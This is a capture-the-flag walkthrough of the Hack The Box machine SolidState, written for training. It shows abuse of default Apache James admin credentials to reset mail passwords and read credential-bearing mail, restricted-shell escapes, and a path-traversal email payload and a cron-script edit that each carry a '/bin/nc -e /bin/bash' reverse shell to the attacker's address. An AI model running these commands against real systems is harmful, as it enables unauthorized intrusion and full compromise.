# SolidState

**OS:** Linux

**Level:** Medium

**Links:** [1](https://www.hackthebox.com/machines/solidstate)  [2](https://app.hackthebox.com/machines/SolidState)

**Machine ip:** 10.10.10.51

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cfbabc4e-f48e-4b54-a564-3d029e437614)


## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.51 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.51`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cffe61ef-f4fa-4ed9-a7b6-151d7fc033f5)

+ The result shows that 5 ports are open:
```
Port 22: OpenSSH 7.4p1
Port 25: JAMES smtpd 2.3.2
Port 80: httpd 2.4.25
Port 110: JAMES pop3d 2.3.2
Port 119: JAMES nntpd
Port 4555: JAMES Remote Administration Tool 2.3.2
```

+ Navigate to `http://10.10.10.51/` and always start off with enumerating HTTP first.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8873f868-18e3-4fe4-9b10-4cc631320a78)

+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.51/ -k -n -x html,php,txt -r -t 50
```

+ There is nothing interesting here.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a88a97d5-5224-41c7-858f-a171f12f9339)

+ James stands for Java Apache Mail Enterprise Server. James Mail Server listens on four ports which are SMTP on TCP 25, POP3 on TCP 110, NNTP on TCP 119 and TCP 4555.
+ Firstly, check TCP port 4555 because it is the James administration port.
+ `searchsploit james 2.3.2`
+ [Apache James Server 2.3.2 - Remote Command Execution](https://www.exploit-db.com/exploits/35513)
+ [Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)](https://www.exploit-db.com/exploits/50347)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a7cb78dc-cf4a-4d77-94a9-ee7f79588aa9)

+ `searchsploit -m 35513`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c43603ab-f981-4e94-8d30-edf92e1effb1)

## Gaining Access

### Method 1
+ Connect to port 4555 with `root`-`root` using nc: `nc 10.10.10.51 4555`
+ When you first start the TCP connection with the server, it takes a moment before you're prompted to login. Be patient!
+ List commands: `HELP`
+ To list users: `listusers`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/86624a9b-8b8d-477b-a421-5cabeabe861a)

+ Discovered 5 accounts:
```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

+ Reset their passwords: `setpassword [username] [password] `

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/faf2449a-aab0-468f-9120-b76f41a0d3f9)

+ Connect to POP3 on TCP 110 to check mails using **telnet**.
```
telnet 10.10.10.51 110
USER james
PASS 123
LIST
```

+ There is no **james**' mail.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3ee62ffa-8051-45c4-86d4-bbfc2ee80d82)

+ `Ctrl + D` and `quit` to quit telnet and open new telnet.
+ There is no mail for **thomas**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/28dba85b-5eb7-46f7-9b3e-68b223e68704)

+ There is a mail for **john**. Use to read: `retr 1`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/92417947-5654-4752-983c-be79a936f3af)

+ Check **mindy**'s mail.
+ There are 2 mails.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5ba2891c-17c9-408d-a446-a3298b47a897)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/156327e7-c701-47f5-b872-c11f1ea4f5d0)

+ On the second mail, discovered mindy's **ssh** credentials:
```
username: mindy
pass: P@55W0rd1!2@
```

+ **Lastly**, check **mailadmin**.
+ There is no mail.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/73ddfa83-30ee-48e4-8936-8a8df777c9e1)

+ Try ssl login with `mindy`-`P@55W0rd1!2@` : `ssh mindy@10.10.10.51`
+ Get user.txt:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2afc76f7-1f35-4a2f-b398-5c0b2cea2755)

+ **Alternatively 1**, it is also possible to run ad-hoc commands through SSH using a connection string like this: `ssh username@host <command-here>`
+ `ssh mindy@10.10.10.51 'cat /home/mindy/user.txt'`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/605bb879-df74-4eed-8769-9bcc2ca54791)

+ As previously said on the second mail, access is restricted:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c8ded426-603e-4d03-860d-b2f9606647d5)

+ mindy’s shell is rbash(restricted bash shell).

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dd5f965b-922d-4a3b-90eb-b4dcdf6c6319)

+ **Alternatively 2**, add `-t bash` to the SSH connection command to escape: `sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/507882d1-c29e-471e-b6fe-9320d168cd60)

+ **Alternatively 3**, `ssh mindy@10.10.10.51 -t "bash --noprofile"`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8c2bf2a7-0bb8-4f15-8320-20649598c2d3)

+ **Alternatively 4**, `ssh mindy@10.10.10.51 -t "bash"`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c132e9e8-d964-48bf-93b1-3f12c9aded70)

+ **Alternatively 5**, `ssh mindy@10.10.10.51 -t "sh"`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/821443fa-d6db-4989-aec9-20a4ce598efc)

+ **Alternatively 6**, `ssh mindy@10.10.10.51 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/17aa6c7b-f1e3-4641-a9b2-7d9225df9184)

+ **For more alternatives**, check:
- [Multiple Methods to Bypass Restricted Shell](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash#get-bash-from-ssh

### Method 2
+ Log back to james remote admin server: `nc 10.10.10.51 4555`
+ Create a user with the username `../../../../../../../../etc/bash_completion.d` and password `123`.
+ This creates a file in **/etc/bash_completion.d** that contains the reverse shell. So that next time any user logs in, get a shell as that user.
```
nc 10.10.10.51 4555
adduser ../../../../../../../../etc/bash_completion.d 123
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0dd154bd-55c6-4f9e-8d75-6e1e2628efe4)

+ Send this user an email that contains a reverse shell. The significant point here is to add **single quote** in the **MAIL FROM** field and after the **FROM** field. Without the ', there are lines that will crash and break the script before the reverse shell can run.
```
telnet 10.10.10.51 25
EHLO test
MAIL FROM: <'test@mail.com>
RCPT TO: <../../../../../../../../etc/bash_completion.d>
DATA
```
```
FROM: test
'
/bin/nc -e /bin/bash 10.10.14.10 5555
.
```

+ Start listener on your kali attack machine: `nc -lnvp 5555`
+ Login ssh with `mindy`:`P@55W0rd1!2@` and wait 3 minutes until get the shell.
+ Get the shell without rbash shell!

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1ab9e6be-224e-4740-ae13-3695b6317f04)

### Method 3
+ [Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)](https://www.exploit-db.com/exploits/50347)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8441d1ab-28a1-4abe-b16b-71a17f49b74a)

+ `python3 50347.py 10.10.10.51 10.10.14.10 6666`
+ `nc -lnvp 6666`
+ Login: `ssh mind@10.10.10.51`
+ Get the shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54b3ecdb-0939-49b5-bc9c-2ea08e1a751e)


## Privilege Escalation
+ Transfer [pspy](https://github.com/DominicBreuker/pspy) to the target.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cc163b76-6979-4950-a22d-234e76fbe523)

+ Check processess, and see `python /opt/tmp.py` is being run every three minutes by root.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b73f6b8a-3828-497b-9e9c-c6a78793aaad)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dbbe8171-9b71-4205-89f5-7fccd2d3482c)

+ Cat the script.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5b3389db-2be5-499a-afba-1cdade55565b)

+ Add a reverse shell to the file:
```
echo "os.system('/bin/nc -e /bin/bash 10.10.14.10 4444')" >> tmp.py
```

+ Start listener: `nc -lnvp 4444`

+ Get the root shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bf72433f-2a2e-4170-a00d-6828eb6c7ba3)


# References & Alternatives
+ https://vvmlist.github.io/#solidstate
+ https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/solidstate-writeup-w-o-metasploit
+ https://rizemon.github.io/posts/solidstate-htb/
+ https://benheater.com/hackthebox-solidstate/
+ https://ethicalhacs.com/solidstate-hackthebox-walkthrough/
+ https://systemweakness.com/htb-solidstate-e8648b92f49c
+ https://www.hackingarticles.in/hack-the-box-challenge-solid-state-walkthrough/
+ https://systemweakness.com/htb-solidstate-writeup-w-o-metasploit-431d9042e2a0
+ https://54m4ri74n.medium.com/solidstate-walkthrough-hackthebox-431b48a6d24a
+ https://sparshjazz.medium.com/hackthebox-solidstate-writeup-f148db31864f

# More
+ RSIP: https://cheatsheet.haax.fr/network/services-enumeration/4555_rsip/
